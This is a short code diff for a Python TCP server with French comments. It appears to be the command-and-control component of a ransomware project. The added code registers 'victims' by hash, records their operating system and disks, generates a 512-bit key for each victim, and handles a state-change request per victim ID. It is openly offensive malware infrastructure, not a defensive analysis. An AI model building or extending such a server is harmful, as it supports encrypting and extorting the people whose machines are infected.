@@ -1,3 +1,4 @@
+import json
 import socket
 import threading
 import utile.security as security
@@ -74,12 +75,20 @@ class server_tcp(object):
             # On demande un ID en particulier pour une recherche d'historique
             # On envoie l'historique
             return udata.history_req(conn, msg[-3:-2])
-        elif msg == 'CHANGE_STATE':
-            # C'est à faire
-            return "Todo3"
+        elif msg_type == 'CHANGE_STATE':
+            msg = json.loads(msg)
+            id_victim = msg['CHGSTATE']
+            return udata.change_state(conn, id_victim)
         elif msg_type == "INITIALIZE_REQ":
-            key_rq = security.gen_key(512)
-            return key_rq
+            # Il faut vérifier si la victime est déjà présente ou non
+            if msg is not None:
+                msg = json.loads(msg)
+                victim = udata.check_hash(conn, msg['INITIALIZE'])
+                if victim is None:
+                    key_rq = security.gen_key(512)
+                    n_victim = udata.insert_victim_new(conn, msg['INITIALIZE'], msg['OS'], msg['DISKS'], str(key_rq))
+                    victim = [n_victim, key_rq, 'INITIALIZE']
+            return message.get_message('initialize_key', victim)
         elif msg == message.close_connexion():
             return 'Thanks you, good bye.'
 
